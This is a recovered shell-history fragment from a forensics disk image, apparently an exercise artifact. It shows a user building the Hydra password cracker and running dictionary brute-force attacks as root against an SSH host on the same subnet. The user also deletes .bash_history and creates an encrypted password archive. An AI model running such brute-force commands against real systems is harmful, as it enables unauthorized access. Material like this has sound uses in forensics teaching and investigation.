@@ -1,0 +1,153 @@
+ASCII Contents of Fragment 886793 in forensics_release-w17.raw-996093-8385929
+
+
+cat .bash_history
+sudo -e /etc/ssh/ssh_config
+ssh fafner.eecs.umich.edu
+cat .ssh/known_hosts 
+rm .ssh/known_hosts 
+ssh fafner.eecs.umich.edu
+cat .ssh/known_hosts 
+sudo -e /etc/ssh/ssh_config
+cat /etc/resolv.conf 
+rm .bash_history
+ifconfig
+sudo ifconfig eth0 essid 141.212.111.41
+sudo ifconfig eth0 141.212.111.41
+ping 141.212.111.42
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+ifconfig
+ping google.com
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+ifconfig
+sudo /etc/init.d/networking restart
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+sudo /etc/init.d/NetworkManager restart
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+ping google.com
+ifconfig
+cat /etc/resolv
+cat /etc/resolv.conf 
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+ping google.com
+ifconfig
+cat /etc/resolv.conf 
+ping google.com
+wget http://freeworld.thc.org/releases/hydra-5.4-src.tar.gz
+tar ztf hydra-5.4-src.tar.gz 
+tar zxf hydra-5.4-src.tar.gz hydra-5.4-src/
+cd hydra-5.4-src/
+ls
+less README
+./configure
+apt-cache search libssh
+sudo aptitude install libssh-2
+apt-cache show libssh-2
+sudo aptitude install libssh-2-dev
+./configure
+apt-cache search libssl
+sudo aptitude install libssl-dev
+./configure
+make
+apt-cache show libssh-2
+less /usr/include/libssh/ssh2.h
+cd `dirname /usr/include/libssh/ssh2.h`
+grep KEX *
+grep COMP *
+less libssh.h
+ls
+cd -
+ls
+less hydra-ssh2.c 
+vi hydra-ssh2.c
+make
+apt-file list libssh-2
+sudo apt-get install apt-file
+sudo apt-file update
+apt-file list libssh-2
+less /usr/include/libssh/libssh.h 
+make
+vim hydra-ssh2.c 
+vi hydra-ssh2.c
+make
+less /usr/include/libssh/libssh.h 
+less /usr/include/libssh/ssh2.h 
+less /usr/include/libssh/libssh.h 
+vi hydra-ssh2.c
+less /usr/include/libssh/libssh.h 
+vi hydra-ssh2.c
+make
+ls
+less Makefile
+./hydra
+apt-cache search gtk dev
+apt-cache search libgtk dev
+sudo ifconfig wlan0 141.212.111.41
+sudo ifconfig eth0 141.212.111.41
+ssh 141.212.111.42
+./hydra
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+./hydra -l root -p test 141.212.111.42 ssh2
+./hydra -l root -p test 141.212.111.42 ssh2 -v
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+ls
+./hydra
+ssh 141.212.111.42
+ssh 141.212.111.42 -l root
+ls
+vi hydra-ssh2.c 
+apt-cache show libssh-2
+cd ..
+wget http://0xbadc0de.be/libssh/libssh-0.11.tgz
+tar ztf libssh-0.11.tgz 
+tar zxf libssh-0.11.tgz
+cd libssh-0.11/
+ls
+./configure --prefix=$HOME
+make
+make install
+cd ../
+rm -rf hydra-5.4-src
+tar zxf hydra-5.4-src.tar.gz 
+cd hydra-5.4-src/
+./configure --help
+./configure
+vi Makefile
+make
+ls ~/lib
+vi Makefile
+make
+ls
+sudo ifconfig eth0 141.212.111.41
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+LD_LIBRARY_PATH=~/lib ./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+lss
+ls
+./hydra -R
+LD_LIBRARY_PATH=~/lib ./hydra -R
+cd
+ls
+cat passwords.txt 
+echo "enigma" > password1.txt
+echo "love" > password2.txt
+echo "supersecret" > password3.txt
+echo "KERMIT" > password4.txt
+echo "eeMeisei700x" > password5.txt
+rm passwords.txt 
+zip passwords.zip password*txt -e
+ls
+rm password*.txt
+unzip -l passwords.zip 
+unzip passwords.zip 
+ls
+cd hydra-5.4-src/
+LD_LIBRARY_PATH=~/lib ./hydra
+ifconfig
+sudo ifconfig eth0 141.212.111.41
+LD_LIBRARY_PATH=~/lib ./hydra -l root -P ~/Desktop/password.lst 141.212.111.42 ssh2
+ssh 141.212.111.42
+ssh 141.212.111.42 -l root
+.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+
+
